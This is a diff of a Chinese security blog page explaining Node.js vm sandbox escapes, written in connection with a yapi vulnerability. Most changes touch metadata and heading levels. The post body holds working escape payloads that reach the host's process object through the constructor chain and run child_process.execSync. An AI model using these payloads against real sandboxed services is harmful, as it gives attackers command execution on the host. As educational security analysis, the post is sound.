@@ -22,17 +22,17 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"qi4l.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.19.2","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":"ture","height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","coll_header":"fadeInLeft"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="前言分析 yapi 的漏洞时接触到就随写">
+    <meta name="description" content="分析 yapi 的漏洞时接触到就随写">
 <meta property="og:type" content="article">
 <meta property="og:title" content="nodejs沙盒逃逸分析">
 <meta property="og:url" content="https://qi4l.github.io/2022/11/17/nodejs%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Qi4l Blog">
-<meta property="og:description" content="前言分析 yapi 的漏洞时接触到就随写">
+<meta property="og:description" content="分析 yapi 的漏洞时接触到就随写">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown1.png">
 <meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown2.png">
-<meta property="article:published_time" content="2022-11-16T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-10-18T01:10:39.345Z">
+<meta property="article:published_time" content="2022-11-17T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-18T08:56:54.307Z">
 <meta property="article:author" content="Qi4l">
 <meta property="article:tag" content="js">
 <meta property="article:tag" content="node.js">
@@ -149,7 +149,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E6%8F%90"><span class="nav-text">前提</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VM%E7%AE%80%E4%BB%8B"><span class="nav-text">VM简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VM%E6%A8%A1%E5%9D%97"><span class="nav-text">VM模块</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="nav-text">沙盒逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%95%E7%94%A8"><span class="nav-text">引用</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E6%8F%90"><span class="nav-text">前提</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM%E7%AE%80%E4%BB%8B"><span class="nav-text">VM简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM%E6%A8%A1%E5%9D%97"><span class="nav-text">VM模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="nav-text">沙盒逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E7%94%A8"><span class="nav-text">引用</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -224,7 +224,7 @@
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="nodejs沙盒逃逸分析 | Qi4l Blog">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="分析 yapi 的漏洞时接触到就随写">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -239,14 +239,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-11-17 00:00:00" itemprop="dateCreated datePublished" datetime="2022-11-17T00:00:00+08:00">2022-11-17</time>
+      <time title="创建时间：2022-11-17 08:00:00" itemprop="dateCreated datePublished" datetime="2022-11-17T08:00:00+08:00">2022-11-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-10-18 09:10:39" itemprop="dateModified" datetime="2025-10-18T09:10:39+08:00">2025-10-18</time>
+      <time title="修改时间：2025-10-18 16:56:54" itemprop="dateModified" datetime="2025-10-18T16:56:54+08:00">2025-10-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -261,18 +261,16 @@
   
 </div>
 
+            <div class="post-description">分析 yapi 的漏洞时接触到就随写</div>
         </div>
       </header>
 
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>分析 yapi 的漏洞时接触到就随写</p>
-<span id="more"></span>
-
-<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>先搞懂原型链污染。</p>
-<h1 id="VM简介"><a href="#VM简介" class="headerlink" title="VM简介"></a>VM简介</h1><p>node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。vm 模块可在 V8 虚拟机上下文中编译和运行代码。 注意的是：vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。</p>
-<h1 id="VM模块"><a href="#VM模块" class="headerlink" title="VM模块"></a>VM模块</h1><p>官方文档原话：</p>
+    <div class="post-body" itemprop="articleBody"><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>先搞懂原型链污染。</p>
+<h2 id="VM简介"><a href="#VM简介" class="headerlink" title="VM简介"></a>VM简介</h2><p>node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。vm 模块可在 V8 虚拟机上下文中编译和运行代码。 注意的是：vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。</p>
+<h2 id="VM模块"><a href="#VM模块" class="headerlink" title="VM模块"></a>VM模块</h2><p>官方文档原话：</p>
 <blockquote>
 <p>一个常见的用例是在不同的 V8 上下文中运行代码。 这意味着被调用的代码与调用的代码具有不同的全局对象。</p>
 </blockquote>
@@ -287,7 +285,7 @@
 <p>当我们去调用 vm.createContext() 方法时， contextObject参数（如果 contextObject 为 undefined，则为新创建的对象）在内部与 V8 上下文的新实例相关联。 该 V8 上下文提供了使用 vm 模块的方法运行的 code 以及可在其中运行的隔离的全局环境。</p>
 <p>沙盒执行上下文是隔离的，但可通过原型链的方式获取到沙盒外的 Function，从而完成逃逸，拿到全局数据，示例图如下：</p>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown2.png"></p>
-<h1 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h1><p>首先看下官方示例</p>
+<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>首先看下官方示例</p>
 <figure class="highlight js"><figcaption><span>js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>,ctx);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Never gets executed.&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>上述代码在执行时，程序在第二行就直接退出，vm虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。</p>
@@ -302,7 +300,7 @@
 <p>把原型链污染中的常用Payload转换过来如下</p>
 <figure class="highlight js"><figcaption><span>js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(</span><br><span class="line">    <span class="string">`</span></span><br><span class="line"><span class="string">    var exec = this.constructor.constructor;</span></span><br><span class="line"><span class="string">    var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();</span></span><br><span class="line"><span class="string">    console.log(require(&#x27;child_process&#x27;).execSync(&quot;ls&quot;).toString());</span></span><br><span class="line"><span class="string">`</span>,</span><br><span class="line">    ctx</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTY2NzQ3">NodeJS沙箱逃逸分析<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTY2NzQ3">NodeJS沙箱逃逸分析<i class="fa fa-external-link-alt"></i></span></p>
 <p><span class="exturl" data-url="aHR0cDovL25vZGVqcy5jbi9hcGkvdm0uaHRtbA==">官方API<i class="fa fa-external-link-alt"></i></span></p>
 <p><span class="exturl" data-url="aHR0cHM6Ly9hb3R1LmlvL25vdGVzLzIwMjAvMTAvMjgvbm9kZS1zYW5kYm94LWVzY2FwZS1hbmFseXNpcy8=">凹凸实验室<i class="fa fa-external-link-alt"></i></span></p>
 <p><span class="exturl" data-url="aHR0cHM6Ly9sZXF1Ny5jb20vZ3Vhbi15dS1qYXZhc2NyaXB0bm9kZWpzLXNoYS1oZS10YW8teWktZmVuLXhpLmh0bWw=">关于javascript:nodejs-沙盒逃逸分析<i class="fa fa-external-link-alt"></i></span></p>
